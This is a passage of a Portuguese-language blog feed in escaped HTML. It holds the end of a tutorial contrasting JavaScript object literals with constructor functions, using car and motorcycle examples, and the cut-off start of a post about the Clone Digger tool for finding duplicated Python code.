&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;constructor&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;Automovel&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;quantidadeRodas&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Acima já reparamos numa das maiores vantagens do &lt;em&gt;object literal&lt;/em&gt;:
&lt;strong&gt;criar &lt;em&gt;namespaces&lt;/em&gt;&lt;/strong&gt;. Isolamos as duas declarações para que possamos
usar os mesmos nomes:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// object literal&lt;/span&gt;
&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;carro&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;object_literal&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Automovel&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;quantidade de rodas:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;carro&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;quantidadeRodas&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// 4&lt;/span&gt;

&lt;span class="c1"&gt;// constructor function&lt;/span&gt;
&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;carro&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;constructor&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Automovel&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;quantidade de rodas:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;carro&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;quantidadeRodas&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// 4&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Acessar &lt;code&gt;quantidadeRodas&lt;/code&gt; de &lt;code&gt;object_literal.Automovel&lt;/code&gt; é muito
mais fácil do que de &lt;code&gt;constructor.Automovel&lt;/code&gt;. Não é errado dizer que
&lt;code&gt;quantidadeRodas&lt;/code&gt; de &lt;code&gt;constructor.Automovel&lt;/code&gt; é um “atributo de
instância”, logo, é necessário criar uma instância da classe para
acessá-lo.&lt;/p&gt;
&lt;h2&gt;Os métodos entram em ação&lt;/h2&gt;
&lt;p&gt;Vamos atribuir aos nossos automóveis a capacidade de &lt;code&gt;ligarMotor&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;object_literal&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;Automovel&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;quantidadeRodas&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="nx"&gt;motorLigado&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;

        &lt;span class="nx"&gt;ligarMotor&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="c1"&gt;//object_literal.Automovel.motorLigado = true;&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;motorLigado&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;

&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;constructor&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;Automovel&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;quantidadeRodas&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;motorLigado&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;

&lt;span class="nx"&gt;constructor&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Automovel&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;prototype&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;ligarMotor&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;motorLigado&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Aqui que as diferenças começam a ficar mais “gritantes”.&lt;/p&gt;
&lt;p&gt;Por não conseguirmos criar uma instância de um &lt;em&gt;object literal&lt;/em&gt; (afinal
de contas, ele já é um objeto), ~~não conseguimos fazer uma referência
&lt;code&gt;this&lt;/code&gt; como em classes~~ não temos a definição de atributos e métodos
via &lt;em&gt;Prototype&lt;/em&gt;. ~~Se o fizéssemos, estaríamos explorando atributos da
função anônima associada à propriedade &lt;code&gt;ligarMotor&lt;/code&gt;, da propriedade
&lt;code&gt;Automovel&lt;/code&gt;, da variável &lt;code&gt;object_literal&lt;/code&gt;~~. Mas, conseguimos
&lt;strong&gt;sim&lt;/strong&gt; explorar atributos e métodos do objeto através do &lt;code&gt;this&lt;/code&gt;. O
mesmo ocorre em &lt;code&gt;ligarMotor&lt;/code&gt; de constructor, o &lt;code&gt;this&lt;/code&gt; é capaz de
acessar os valores e métodos nas instâncias de &lt;code&gt;Automovel&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// object literal&lt;/span&gt;
&lt;span class="nx"&gt;carro&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;ligarMotor&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;motor ligado:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;carro&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;motorLigado&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// true&lt;/span&gt;

&lt;span class="c1"&gt;// constructor function&lt;/span&gt;
&lt;span class="nx"&gt;carro&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;ligarMotor&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;motor ligado:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;carro&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;motorLigado&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// true&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Atributos diferentes para instâncias diferentes&lt;/h2&gt;
&lt;p&gt;Sabemos que um automóvel pode ter 2, 4, 6 ou até 8 rodas, então vamos
adaptá-los:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;constructor&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;Automovel&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;qtndRodas&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;quantidadeRodas&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;qtndRodas&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;motorLigado&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ué?! Mas e o &lt;strong&gt;object literal&lt;/strong&gt;? Pois é.. como ele não pode gerar
instâncias (novamente, ele já é um objeto), temos que alterar “na mão”:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// object literal&lt;/span&gt;
&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;moto&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;object_literal&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Automovel&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="nx"&gt;moto&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;quantidadeRodas&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;quantidade de rodas (moto):&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;moto&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;quantidadeRodas&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// 2&lt;/span&gt;

&lt;span class="c1"&gt;// constructor function&lt;/span&gt;
&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;moto&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;constructor&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Automovel&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;quantidade de rodas (moto):&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;moto&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;quantidadeRodas&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// 2&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Só por curiosidade, como estarão os nossos objetos &lt;code&gt;carro&lt;/code&gt;? (Lá vem a
pegadinha =P )&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// object literal&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;quantidade de rodas (carro):&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;carro&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;quantidadeRodas&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// 2&lt;/span&gt;

&lt;span class="c1"&gt;// constructor function&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;quantidade de rodas (carro):&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;carro&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;quantidadeRodas&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// 4&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Pelo lado da instância de &lt;code&gt;constructor.Automovel&lt;/code&gt;, nenhuma surpresa.
Mas o que aconteceu com o valor do atributo &lt;code&gt;quantidadeRodas&lt;/code&gt; da
variável &lt;code&gt;carro&lt;/code&gt; em &lt;code&gt;object_literal.Automovel&lt;/code&gt;?&lt;/p&gt;
&lt;h2&gt;Instâncias x Referências&lt;/h2&gt;
&lt;p&gt;A grosso modo, com uso de &lt;em&gt;constructor functions&lt;/em&gt;, criamos uma
“estrutura” (classe), que a cada &lt;code&gt;new&lt;/code&gt; é “copiada” para um novo espaço
na memória (instância). Assim, a propriedade &lt;code&gt;quantidadeRodas&lt;/code&gt; de moto
é diferente da propriedade de mesmo nome, da instância &lt;code&gt;carro&lt;/code&gt; (&lt;a href="http://pt.wikipedia.org/wiki/Inst%C3%A2ncia_(classe)" title="Leia mais sobre instância no Wikipedia"&gt;leia mais sobre instâncias e classes&lt;/a&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// constructor function&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;carro == moto:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;carro&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nx"&gt;moto&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;// false&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Já com &lt;em&gt;object literal&lt;/em&gt;, não temos a capacidade de criar uma classe.
Criamos diretamente uma instância, e vinculamos o espaço na memória onde
esta foi criada à uma variável. No nosso caso, a variável em questão é
&lt;code&gt;object_literal.Automovel&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Quando atribuímos &lt;code&gt;object_literal.Automovel&lt;/code&gt; à variável &lt;code&gt;carro&lt;/code&gt; e
depois à variável &lt;code&gt;moto&lt;/code&gt;, na verdade estávamos criando referências a
instânca contida em &lt;code&gt;object_literal.Automovel&lt;/code&gt; (ou seja, as três
variáveis correspondem ao mesmo endereço e valor na memória):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// object literal&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;carro == moto:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;carro&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nx"&gt;moto&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;// true&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Portanto, se eu criar uma variável chamada &lt;code&gt;moto2&lt;/code&gt; e atribuir a ela a
instância de &lt;code&gt;constructor.Automovel&lt;/code&gt; contida em &lt;code&gt;moto&lt;/code&gt;, terei o
mesmo resultado que acima:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// constructor function&lt;/span&gt;
&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;moto2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;moto&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="nx"&gt;moto2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;quantidadeRodas&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;quantidade de rodas (instancia carro):&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;carro&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;quantidadeRodas&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// 4&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;quantidade de rodas (instancia moto):&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;moto&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;quantidadeRodas&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// 3&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;quantidade de rodas (referencia moto2):&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;moto2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;quantidadeRodas&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// 3&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;moto == moto2:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;moto&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nx"&gt;moto2&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// true&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Interessante, não?&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Uma vez descobrindo a diferença entre &lt;em&gt;object literal&lt;/em&gt; e &lt;em&gt;constructor function&lt;/em&gt;,
notamos que não há diferenças conceituais em relação a
linguagens como &lt;em&gt;Python&lt;/em&gt;, &lt;em&gt;C++&lt;/em&gt; ou &lt;em&gt;Java&lt;/em&gt;. Basta termos em mente que o
tipo de escrita, através da &lt;em&gt;prototype&lt;/em&gt;, é diferente (e mais dinâmica)
do que o usual, mas os resultados são (conceitualmente falando)
praticamente os mesmos.&lt;/p&gt;
&lt;p&gt;Então, quando você tiver um tipo que possuirá várias instâncias, utilize
&lt;em&gt;constructor functions&lt;/em&gt;. Quando quiser criar objetos “estáticos”, que
não sofrerão alterações no decorrer de uma execução (como o exemplo do
namespace), utilize &lt;em&gt;object literal&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://net.tutsplus.com/tutorials/javascript-ajax/the-basics-of-object-oriented-javascript/" title="The Basics of Object-Oriented JavaScript"&gt;&lt;em&gt;Nettuts+ – The Basics of Object-Oriented JavaScript&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://net.tutsplus.com/tutorials/javascript-ajax/stop-nesting-functions-but-not-all-of-them/" title="Stop Nesting Functions! But Not All of Them"&gt;&lt;em&gt;Nettuts+ – Stop Nesting Functions! (But Not All of Them)&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;O exemplo completo está disponível para download em:
&lt;a href="https://github.com/kplaube/post-javascript-object-literal-constructors" title="Veja o exemplo completo no GitHub"&gt;https://github.com/kplaube/post-javascript-object-literal-constructors&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Até a próxima…&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="javascript"></category><category term="prototype"></category><category term="oop"></category><category term="web"></category></entry><entry><title>Assegure a qualidade do seu código Python - Clone Digger</title><link href="https://klauslaube.com.br/2011/10/16/assegure-qualidade-seu-codigo-python-clone-digger.html" rel="alternate"></link><published>2011-10-16T22:10:00-02:00</published><updated>2011-10-16T22:10:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2011-10-16:/2011/10/16/assegure-qualidade-seu-codigo-python-clone-digger.html</id><summary type="html">&lt;p&gt;Mesmo que você possa verificar a qualidade do seu
código com &lt;a href="https://klauslaube.com.br/2011/08/26/assegure-qualidade-seu-codigo-python-pep.html" title="Assegure a qualidade do seu código Python – pep8"&gt;&lt;em&gt;pep8&lt;/em&gt;&lt;/a&gt;, &lt;a href="https://klauslaube.com.br/2011/09/06/assegura-a-qualidade-de-codigo-python-pylint.html" title="Assegure a qualidade do seu código Python – Pylint"&gt;&lt;em&gt;Pylint&lt;/em&gt;&lt;/a&gt; e &lt;a href="https://klauslaube.com.br/2011/10/02/assegure-qualidade-seu-codigo-python-pyflakes.html" title="Assegure a qualidade do seu código Python – Pyflakes"&gt;&lt;em&gt;Pyflakes&lt;/em&gt;&lt;/a&gt;, uma das virtudes
de um projeto de &lt;em&gt;software&lt;/em&gt; é não possuir código duplicado (leia mais
sobre &lt;a href="http://pt.wikipedia.org/wiki/Don%27t_repeat_yourself" title="Leia mais sobre Don't Repeat Yourself no Wikipedia"&gt;&lt;em&gt;DRY&lt;/em&gt;&lt;/a&gt;). O fato é que tanto intencionalmente como
propositalmente, podemos duplicar um trecho de código e acabar
prejudicando manutenções …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Mesmo que você possa verificar a qualidade do seu
código com &lt;a href="https://klauslaube.com.br/2011/08/26/assegure-qualidade-seu-codigo-python-pep.html" title="Assegure a qualidade do seu código Python – pep8"&gt;&lt;em&gt;pep8&lt;/em&gt;&lt;/a&gt;, &lt;a href="https://klauslaube.com.br/2011/09/06/assegura-a-qualidade-de-codigo-python-pylint.html" title="Assegure a qualidade do seu código Python – Pylint"&gt;&lt;em&gt;Pylint&lt;/em&gt;&lt;/a&gt; e &lt;a href="https://klauslaube.com.br/2011/10/02/assegure-qualidade-seu-codigo-python-pyflakes.html" title="Assegure a qualidade do seu código Python – Pyflakes"&gt;&lt;em&gt;Pyflakes&lt;/em&gt;&lt;/a&gt;, uma das virtudes
de um projeto de &lt;em&gt;software&lt;/em&gt; é não possuir código duplicado (leia mais
sobre &lt;a href="http://pt.wikipedia.org/wiki/Don%27t_repeat_yourself" title="Leia mais sobre Don't Repeat Yourself no Wikipedia"&gt;&lt;em&gt;DRY&lt;/em&gt;&lt;/a&gt;). O fato é que tanto intencionalmente como
propositalmente, podemos duplicar um trecho de código e acabar
prejudicando manutenções futuras (atire a primeira pedra quem nunca deu
aquele &lt;code&gt;CTRL+C&lt;/code&gt; e &lt;code&gt;CTRL+V&lt;/code&gt;, e prometeu um &lt;em&gt;refactoring&lt;/em&gt; depois).&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Para facilitar a busca por código duplicado, podemos utilizar uma
ferramenta chamada &lt;strong&gt;&lt;em&gt;Clone Digger&lt;/em&gt;&lt;/strong&gt;. Prático, rápido e muito simples.
Agora ficou fácil “caçar” código duplicado em projetos &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Na prática&lt;/h2&gt;
&lt;p&gt;Por tratar-se de uma ferramenta bem objetiva, não há muito o que falar
sobre o &lt;a href="http://clonedigger.sourceforge.net/index.html" title="Página oficial do projeto Clone Digger"&gt;&lt;em&gt;Clone Digger&lt;/em&gt;&lt;/a&gt;. Então, vamos direto para a parte prática.&lt;/p&gt;
&lt;p&gt;Para iniciar a análise, basta chamar o executável apontando para o
diretório do seu projeto:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ clonedigger meuprojeto/
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Será gerado um arquivo chamado &lt;code&gt;output.html&lt;/code&gt;, com um relatório
